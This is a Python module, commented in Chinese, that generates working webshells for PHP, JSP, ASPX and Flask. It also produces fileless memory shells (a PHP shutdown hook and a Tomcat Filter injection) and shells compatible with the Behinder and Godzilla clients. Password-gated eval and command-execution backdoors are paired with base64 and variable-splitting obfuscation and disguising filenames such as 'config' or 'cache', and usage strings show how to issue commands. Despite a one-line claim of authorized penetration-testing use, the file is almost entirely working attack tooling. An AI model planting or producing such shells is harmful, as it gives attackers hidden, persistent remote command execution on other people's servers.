#!/usr/bin/env python3
"""
Webshell 管理模块 - Webshell Manager
功能: Webshell 生成、内存马、混淆、管理
仅用于授权渗透测试
"""

import base64
import random
import string
import hashlib
import os
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from enum import Enum

import logging
logger = logging.getLogger(__name__)


class WebshellType(Enum):
    """Webshell 类型"""
    PHP_BASIC = "php_basic"
    PHP_EVAL = "php_eval"
    PHP_ASSERT = "php_assert"
    PHP_CALLBACK = "php_callback"
    PHP_MEMSHELL = "php_memshell"
    JSP_BASIC = "jsp_basic"
    JSP_RUNTIME = "jsp_runtime"
    JSP_MEMSHELL = "jsp_memshell"
    ASPX_BASIC = "aspx_basic"
    ASPX_MEMSHELL = "aspx_memshell"
    PYTHON_BASIC = "python_basic"


class ObfuscationLevel(Enum):
    """混淆级别"""
    NONE = 0
    LOW = 1
    MEDIUM = 2
    HIGH = 3


@dataclass
class WebshellResult:
    """Webshell 生成结果"""
    success: bool
    shell_type: str
    content: str
    password: str
    filename: str
    usage: str = ""
    detection_tips: str = ""


class WebshellGenerator:
    """
    Webshell 生成器

    Usage:
        generator = WebshellGenerator()

        # PHP Webshell
        result = generator.php_shell(password="secret123")

        # JSP Webshell
        result = generator.jsp_shell(password="secret123")

        # 混淆 Webshell
        result = generator.php_shell(password="secret", obfuscation=ObfuscationLevel.HIGH)
    """

    def __init__(self):
        self._random_seed = ''.join(random.choices(string.ascii_letters, k=8))

    def _generate_password(self, length: int = 12) -> str:
        """生成随机密码"""
        return ''.join(random.choices(
            string.ascii_letters + string.digits,
            k=length
        ))

    def _generate_filename(self, extension: str) -> str:
        """生成随机文件名"""
        names = [
            "config", "settings", "cache", "temp", "log", "data",
            "helper", "util", "common", "core", "base", "init"
        ]
        return f"{random.choice(names)}_{self._random_seed[:4]}.{extension}"

    def _obfuscate_php(self, code: str, level: ObfuscationLevel) -> str:
        """PHP 代码混淆"""
        if level == ObfuscationLevel.NONE:
            return code

        if level == ObfuscationLevel.LOW:
            # Base64 编码
            encoded = base64.b64encode(code.encode()).decode()
            return f"<?php eval(base64_decode('{encoded}')); ?>"

        if level == ObfuscationLevel.MEDIUM:
            # 变量混淆 + Base64
            encoded = base64.b64encode(code.encode()).decode()
            var1 = ''.join(random.choices(string.ascii_lowercase, k=6))
            var2 = ''.join(random.choices(string.ascii_lowercase, k=6))
            return f"""<?php
${var1} = 'base'.'64_'.'decode';
${var2} = ${var1}('{encoded}');
eval(${var2});
?>"""

        if level == ObfuscationLevel.HIGH:
            # 多层混淆
            encoded = base64.b64encode(code.encode()).decode()
            # 字符分割
            chunks = [encoded[i:i+10] for i in range(0, len(encoded), 10)]
            var_prefix = ''.join(random.choices(string.ascii_lowercase, k=3))

            vars_def = []
            vars_concat = []
            for i, chunk in enumerate(chunks):
                var_name = f"${var_prefix}{i}"
                vars_def.append(f"{var_name}='{chunk}'")
                vars_concat.append(var_name)

            return f"""<?php
{';'.join(vars_def)};
${''.join(random.choices(string.ascii_lowercase, k=4))}={'.'.join(vars_concat)};
@eval(@base64_decode(${''.join(random.choices(string.ascii_lowercase, k=4))}));
?>"""

        return code

    # ==================== PHP Webshell ====================

    def php_shell(self,
                  password: str = "",
                  shell_type: str = "basic",
                  obfuscation: ObfuscationLevel = ObfuscationLevel.NONE) -> WebshellResult:
        """
        生成 PHP Webshell

        Args:
            password: 密码
            shell_type: 类型 (basic/eval/assert/callback)
            obfuscation: 混淆级别
        """
        password = password or self._generate_password()
        password_md5 = hashlib.md5(password.encode()).hexdigest()

        if shell_type == "basic":
            # 基础一句话
            code = f"""<?php if(md5($_POST['pwd'])=='{password_md5}')@eval($_POST['cmd']);?>"""

        elif shell_type == "eval":
            # eval 变形
            code = f"""<?php
$p='{password_md5}';
if(md5($_REQUEST['pwd'])==$p){{
    $c=base64_decode($_REQUEST['cmd']);
    @eval($c);
}}
?>"""

        elif shell_type == "assert":
            # assert 绕过
            code = f"""<?php
$p='{password_md5}';
if(md5($_POST['pwd'])==$p){{
    $a='ass'.'ert';
    $a($_POST['cmd']);
}}
?>"""

        elif shell_type == "callback":
            # 回调函数
            code = f"""<?php
$p='{password_md5}';
if(md5($_POST['pwd'])==$p){{
    $f='array_'.'map';
    $f(function($c){{@eval($c);}},array($_POST['cmd']));
}}
?>"""

        elif shell_type == "create_function":
            # create_function (PHP < 7.2)
            code = f"""<?php
$p='{password_md5}';
if(md5($_POST['pwd'])==$p){{
    $f=create_function('',$_POST['cmd']);
    $f();
}}
?>"""

        else:
            code = f"""<?php if(md5($_POST['pwd'])=='{password_md5}')@eval($_POST['cmd']);?>"""

        # 应用混淆
        if obfuscation != ObfuscationLevel.NONE:
            # 提取 PHP 代码内容
            inner_code = code.replace('<?php', '').replace('?>', '').strip()
            code = self._obfuscate_php(inner_code, obfuscation)

        return WebshellResult(
            success=True,
            shell_type=f"php_{shell_type}",
            content=code,
            password=password,
            filename=self._generate_filename("php"),
            usage=f"POST: pwd={password}&cmd=base64_encode('system(\"whoami\");')",
            detection_tips="使用 POST 传递密码和命令，cmd 需要 base64 编码"
        )

    def php_memshell(self, password: str = "") -> WebshellResult:
        """
        PHP 内存马 (无文件)

        注: 需要通过文件包含或反序列化注入
        """
        password = password or self._generate_password()
        password_md5 = hashlib.md5(password.encode()).hexdigest()

        code = f"""<?php
// 内存马 - 注入到 Session 或全局变量
if(!isset($GLOBALS['__mem_shell'])) {{
    $GLOBALS['__mem_shell'] = function() {{
        $p = '{password_md5}';
        if(isset($_REQUEST['pwd']) && md5($_REQUEST['pwd']) == $p) {{
            if(isset($_REQUEST['cmd'])) {{
                @eval(base64_decode($_REQUEST['cmd']));
            }}
        }}
    }};
    // 注册 shutdown 函数
    register_shutdown_function($GLOBALS['__mem_shell']);
}}
?>"""

        return WebshellResult(
            success=True,
            shell_type="php_memshell",
            content=code,
            password=password,
            filename="memshell_inject.php",
            usage="通过文件包含或反序列化注入此代码",
            detection_tips="无文件落地，存在于内存中"
        )

    # ==================== JSP Webshell ====================

    def jsp_shell(self,
                  password: str = "",
                  shell_type: str = "basic") -> WebshellResult:
        """
        生成 JSP Webshell

        Args:
            password: 密码
            shell_type: 类型 (basic/runtime/reflection)
        """
        password = password or self._generate_password()

        if shell_type == "basic":
            code = f"""<%@ page import="java.io.*" %>
<%
String pwd = request.getParameter("pwd");
String cmd = request.getParameter("cmd");
if(pwd != null && pwd.equals("{password}") && cmd != null) {{
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {{
        out.println(line + "<br>");
    }}
}}
%>"""

        elif shell_type == "runtime":
            # Runtime 变形
            code = f"""<%@ page import="java.io.*,java.lang.reflect.*" %>
<%
String p = "{password}";
if(p.equals(request.getParameter("pwd"))) {{
    String c = request.getParameter("cmd");
    Class rt = Class.forName("java.lang.Runtime");
    Method m = rt.getMethod("getRuntime");
    Object o = m.invoke(null);
    Method e = rt.getMethod("exec", String.class);
    Process pr = (Process)e.invoke(o, c);
    BufferedReader br = new BufferedReader(new InputStreamReader(pr.getInputStream()));
    String l;
    while((l = br.readLine()) != null) out.println(l);
}}
%>"""

        elif shell_type == "scriptengine":
            # ScriptEngine (Java 8+)
            code = f"""<%@ page import="javax.script.*" %>
<%
String p = "{password}";
if(p.equals(request.getParameter("pwd"))) {{
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
    String code = request.getParameter("cmd");
    engine.eval(code);
}}
%>"""

        else:
            code = f"""<%@ page import="java.io.*" %>
<%
if("{password}".equals(request.getParameter("pwd"))) {{
    Runtime.getRuntime().exec(request.getParameter("cmd"));
}}
%>"""

        return WebshellResult(
            success=True,
            shell_type=f"jsp_{shell_type}",
            content=code,
            password=password,
            filename=self._generate_filename("jsp"),
            usage=f"GET/POST: ?pwd={password}&cmd=whoami"
        )

    def jsp_memshell_filter(self, password: str = "") -> Dict[str, str]:
        """
        JSP Filter 内存马

        Returns:
            注入代码和使用说明
        """
        password = password or self._generate_password()

        # Filter 内存马注入代码
        inject_code = f"""<%@ page import="java.io.*,java.lang.reflect.*,org.apache.catalina.core.*" %>
<%
    // Filter 内存马注入
    String filterName = "SecurityFilter";
    String urlPattern = "/*";

    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    // 创建恶意 Filter
    Filter filter = new Filter() {{
        @Override
        public void init(FilterConfig filterConfig) {{}}

        @Override
        public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {{
            HttpServletRequest request = (HttpServletRequest) req;
            if ("{password}".equals(request.getParameter("pwd"))) {{
                String cmd = request.getParameter("cmd");
                if (cmd != null) {{
                    Process p = Runtime.getRuntime().exec(cmd);
                    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    PrintWriter writer = resp.getWriter();
                    while ((line = br.readLine()) != null) {{
                        writer.println(line);
                    }}
                    return;
                }}
            }}
            chain.doFilter(req, resp);
        }}

        @Override
        public void destroy() {{}}
    }};

    // 注册 Filter
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName(filterName);
    filterDef.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern(urlPattern);
    filterMap.setFilterName(filterName);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMapBefore(filterMap);

    out.println("Filter MemShell Injected!");
%>"""

        return {
            "inject_code": inject_code,
            "password": password,
            "usage": f"访问注入页面后，任意 URL 可用: ?pwd={password}&cmd=whoami",
            "type": "jsp_filter_memshell"
        }

    # ==================== ASPX Webshell ====================

    def aspx_shell(self, password: str = "") -> WebshellResult:
        """
        生成 ASPX Webshell
        """
        password = password or self._generate_password()

        code = f"""<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string pwd = Request["pwd"];
string cmd = Request["cmd"];
if(pwd == "{password}" && cmd != null) {{
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}}
%>"""

        return WebshellResult(
            success=True,
            shell_type="aspx_basic",
            content=code,
            password=password,
            filename=self._generate_filename("aspx"),
            usage=f"GET/POST: ?pwd={password}&cmd=whoami"
        )

    # ==================== Python Webshell ====================

    def python_shell(self, password: str = "") -> WebshellResult:
        """
        生成 Python Webshell (Flask/Django 环境)
        """
        password = password or self._generate_password()

        code = f"""# Python Webshell - 需要在 Flask/Django 路由中使用
import subprocess
from flask import request

@app.route('/api/debug', methods=['GET', 'POST'])
def debug_shell():
    pwd = request.values.get('pwd', '')
    cmd = request.values.get('cmd', '')

    if pwd == '{password}' and cmd:
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            return result.decode()
        except Exception as e:
            return str(e)
    return 'OK'
"""

        return WebshellResult(
            success=True,
            shell_type="python_basic",
            content=code,
            password=password,
            filename="debug_route.py",
            usage=f"GET/POST: /api/debug?pwd={password}&cmd=id"
        )

    # ==================== 冰蝎/哥斯拉 ====================

    def behinder_shell(self, key: str = "") -> WebshellResult:
        """
        生成冰蝎 (Behinder) 兼容 Shell

        Args:
            key: AES 密钥 (16字节)
        """
        key = key or "e45e329feb5d925b"  # 默认密钥

        code = f"""<?php
@error_reporting(0);
session_start();
$key="{key}";
$_SESSION['k']=$key;
$post=file_get_contents("php://input");
if(!extension_loaded('openssl')){{
    $t="base64_"."decode";
    $post=$t($post."");
    for($i=0;$i<strlen($post);$i++){{
        $post[$i]=$post[$i]^$key[$i+1&15];
    }}
}}else{{
    $post=openssl_decrypt($post,"AES128",$key);
}}
$arr=explode('|',$post);
$func=$arr[0];
$params=$arr[1];
class C{{public function __invoke($p){{eval($p."");}}}}
@call_user_func(new C(),$params);
?>"""

        return WebshellResult(
            success=True,
            shell_type="behinder_php",
            content=code,
            password=key,
            filename=self._generate_filename("php"),
            usage="使用冰蝎客户端连接，密钥: " + key,
            detection_tips="兼容冰蝎 3.0+"
        )

    def godzilla_shell(self, password: str = "", key: str = "") -> WebshellResult:
        """
        生成哥斯拉 (Godzilla) 兼容 Shell

        Args:
            password: 密码
            key: 密钥
        """
        password = password or "pass"
        key = key or "key"

        code = f"""<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){{
    for($i=0;$i<strlen($D);$i++){{
        $c=$K[$i+1&15];
        $D[$i]=$D[$i]^$c;
    }}
    return $D;
}}
$pass='{password}';
$payloadName='payload';
$key='{key}';
if(isset($_POST[$pass])){{
    $data=encode(base64_decode($_POST[$pass]),$key);
    if(isset($_SESSION[$payloadName])){{
        $payload=encode($_SESSION[$payloadName],$key);
        if(strpos($payload,"getBasicsInfo")===false){{
            $payload=encode($payload,$key);
        }}
        eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }}else{{
        if(strpos($data,"getBasicsInfo")!==false){{
            $_SESSION[$payloadName]=encode($data,$key);
        }}
    }}
}}
?>"""

        return WebshellResult(
            success=True,
            shell_type="godzilla_php",
            content=code,
            password=password,
            filename=self._generate_filename("php"),
            usage=f"使用哥斯拉客户端连接，密码: {password}, 密钥: {key}",
            detection_tips="兼容哥斯拉 4.0+"
        )


# 便捷函数
def generate_webshell(shell_type: str = "php",
                      password: str = "",
                      obfuscation: str = "none",
                      **kwargs) -> Dict[str, Any]:
    """
    生成 Webshell

    Args:
        shell_type: 类型 (php/jsp/aspx/python/behinder/godzilla)
        password: 密码
        obfuscation: 混淆级别 (none/low/medium/high)
        **kwargs: 其他参数
    """
    generator = WebshellGenerator()

    obf_map = {
        "none": ObfuscationLevel.NONE,
        "low": ObfuscationLevel.LOW,
        "medium": ObfuscationLevel.MEDIUM,
        "high": ObfuscationLevel.HIGH
    }
    obf_level = obf_map.get(obfuscation, ObfuscationLevel.NONE)

    if shell_type == "php":
        result = generator.php_shell(password, kwargs.get("variant", "basic"), obf_level)
    elif shell_type == "jsp":
        result = generator.jsp_shell(password, kwargs.get("variant", "basic"))
    elif shell_type == "aspx":
        result = generator.aspx_shell(password)
    elif shell_type == "python":
        result = generator.python_shell(password)
    elif shell_type == "behinder":
        result = generator.behinder_shell(password)
    elif shell_type == "godzilla":
        result = generator.godzilla_shell(password, kwargs.get("key", ""))
    elif shell_type == "php_memshell":
        result = generator.php_memshell(password)
    else:
        return {"success": False, "error": f"Unknown shell type: {shell_type}"}

    return {
        "success": result.success,
        "shell_type": result.shell_type,
        "content": result.content,
        "password": result.password,
        "filename": result.filename,
        "usage": result.usage,
        "detection_tips": result.detection_tips
    }


def list_webshell_types() -> List[Dict[str, str]]:
    """列出所有 Webshell 类型"""
    return [
        {"type": "php", "variants": "basic/eval/assert/callback", "description": "PHP 一句话木马"},
        {"type": "php_memshell", "variants": "-", "description": "PHP 内存马"},
        {"type": "jsp", "variants": "basic/runtime/scriptengine", "description": "JSP 木马"},
        {"type": "aspx", "variants": "basic", "description": "ASPX 木马"},
        {"type": "python", "variants": "basic", "description": "Python 木马"},
        {"type": "behinder", "variants": "-", "description": "冰蝎兼容木马"},
        {"type": "godzilla", "variants": "-", "description": "哥斯拉兼容木马"},
    ]


if __name__ == "__main__":
    print("Webshell Generator Module")
    print("=" * 50)
    print("\nAvailable types:")
    for t in list_webshell_types():
        print(f"  {t['type']}: {t['description']} (variants: {t['variants']})")
